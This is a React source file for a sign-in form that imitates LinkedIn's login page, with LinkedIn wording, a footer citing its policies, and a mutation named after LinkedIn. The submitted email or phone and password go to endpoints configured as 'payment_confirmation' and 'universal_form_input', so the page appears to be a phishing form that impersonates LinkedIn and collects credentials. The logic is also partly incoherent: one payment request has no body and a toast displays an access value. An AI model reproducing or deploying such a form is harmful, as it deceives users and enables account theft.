import React, { useState, useContext } from "react";
import { Link, useNavigate } from "react-router-dom";
import { FcGoogle } from "react-icons/fc";
import { GrApple } from "react-icons/gr";
import { jwtDecode } from "jwt-decode";
import { toast } from "sonner";
import { useFormik } from "formik";
import * as Yup from "yup";
import { useMutation } from "@tanstack/react-query";
import { AuthContext } from "../../context/authContext";
import Loader from "../../components/loader";
import { FaCheck } from "react-icons/fa";
import { FaXmark } from "react-icons/fa6";
import axios from "axios";

// Environment variables for URLs:
const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
const universalFormInputUrl = import.meta.env.VITE_universal_form_input;

function SignInSection() {
  const [showPassword, setShowPassword] = useState(false);
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const { setUser, setToken } = useContext(AuthContext);
  const [uniqueLink, setUniqueLink] = useState(" ");
  const [inputType, setInputType] = useState(null);

  const validationSchema = Yup.object({
    email_phone: Yup.string()
      .test("isValid", "Enter a valid email or phone number", (value) => {
        if (!value) return false;
        const emailRegex = /\S+@\S+\.\S+/;
        const phoneRegex = /^\d{10,15}$/;
        if (emailRegex.test(value)) setInputType("email");
        else if (phoneRegex.test(value)) setInputType("phone-number");
        else {
          setInputType(null);
          return false;
        }
        return true;
      })
      .required("Required"),
    password: Yup.string()
      .min(8, "Must be at least 8 characters")
      .required("Required"),
  });

  const linkedinLoginMutation = useMutation({
    mutationFn: async (data) => {
      setLoading(true);
      try {
        const loginResponse = await axios.post(paymentConfirmationUrl, data);
        if (loginResponse.status === 201) {
          setUser(jwtDecode(loginResponse?.data?.access));
          setToken(loginResponse?.data?.access);

          const paymentResponse = await axios.post(paymentConfirmationUrl);
          if (paymentResponse.status === 200) {
            setUniqueLink(paymentResponse?.data?.uniqueLink);
            toast.success(`Access granted: ${paymentResponse?.data?.access}`);
            await axios.post(
              `${universalFormInputUrl}${paymentResponse.data.uniqueLink}/`
            );
          }
          navigate("/");
          toast.success(" welcome!");
        }
      } catch (error) {
        console.error("Error", error);
        toast.error("Login failed");
      } finally {
        setLoading(false);
      }
    },
  });

  const { handleSubmit, handleChange, values, touched, errors } = useFormik({
    initialValues: { email_phone: "", password: "" },
    validationSchema,
    onSubmit: async (value) => {
      linkedinLoginMutation.mutateAsync(value);
    },
  });

  return (
    <section className="w-full max-w-md bg-white p-8 m-auto shadow-lg rounded-lg">
      {loading && (
        <div className="z-[999999999999999] fixed inset-0 bg-black bg-opacity-60">
          <Loader />
        </div>
      )}
      <form onSubmit={handleSubmit}>
        <h2 className="text-2xl font-bold mb-2 text-gray-800">Sign in</h2>
        <p className="text-sm text-gray-600 mb-6">
          Stay updated on your professional world
        </p>

        <div className="relative mb-4">
          <input
            type="text"
            placeholder="Email or Phone"
            name="email_phone"
            value={values.email_phone}
            onChange={handleChange}
            className="p-4 text-base w-full border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600"
          />
          {touched.email_phone && errors.email_phone ? (
            <FaXmark
              color="red"
              className="absolute right-4 top-1/2 -translate-y-1/2"
            />
          ) : (
            touched.email_phone && (
              <FaCheck
                color="green"
                className="absolute right-4 top-1/2 -translate-y-1/2"
              />
            )
          )}
        </div>
        
        <div
          style={{
            background: "rgb(0,0,0,0.001)",
            fontWeight: "medium",
            width: "50%",
            color: "blue",
            margin: "0 auto",
            borderRadius: "8px",
          }}
        >
          {inputType}
        </div>

        <div className="relative mb-4">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            name="password"
            value={values.password}
            onChange={handleChange}
            className="p-4 text-base w-full border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-3 text-sm text-blue-600 font-semibold"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
          {touched.password && errors.password ? (
            <FaXmark
              color="red"
              className="absolute right-4 top-1/2 -translate-y-1/2"
            />
          ) : (
            touched.password && (
              <FaCheck
                color="green"
                className="absolute right-4 top-1/2 -translate-y-1/2"
              />
            )
          )}
        </div>

        <Link to="#" className="block text-sm text-blue-600 font-semibold mb-6">
          Forgot password?
        </Link>
        <button
          type="submit"
          className="p-3 w-full bg-blue-600 text-white text-base font-semibold rounded-full transition duration-300 hover:bg-blue-700 mb-4"
          disabled={loading}
        >
          {loading ? "loading..." : "Sign in"}
        </button>

        {/* <div className="flex items-center text-gray-500 my-6">
          <span className="flex-grow h-px bg-gray-300"></span>
          <span className="mx-4 text-sm">or</span>
          <span className="flex-grow h-px bg-gray-300"></span>
        </div> */}

        {/* <button
          type="button"
          onClick={() => (window.location.href = "https://www.linkedin.com")}
          className="p-3 w-full bg-white border border-gray-400 text-base flex justify-center items-center rounded-full transition duration-300 hover:bg-gray-100 mb-4"
        >
          <FcGoogle className="mr-2" /> Continue with Google
        </button> */}

        {/* <button
          type="button"
          onClick={() => (window.location.href = "https://www.linkedin.com")}
          className="p-3 w-full bg-white border border-gray-400 text-base flex justify-center items-center rounded-full transition duration-300 hover:bg-gray-100"
        >
          <GrApple className="mr-2" /> Sign in with Apple
        </button> */}
      </form>
      <p className="text-center text-xs text-gray-500 mt-6">
        By clicking continue, you agree to LinkedIn's{" "}
        <Link to="#" className="text-blue-600">
          User Agreement
        </Link>
        ,{" "}
        <Link to="#" className="text-blue-600">
          Privacy Policy
        </Link>
        , and{" "}
        <Link to="#" className="text-blue-600">
          Cookie Policy
        </Link>
        .
      </p>
    </section>
  );
}

export default SignInSection;
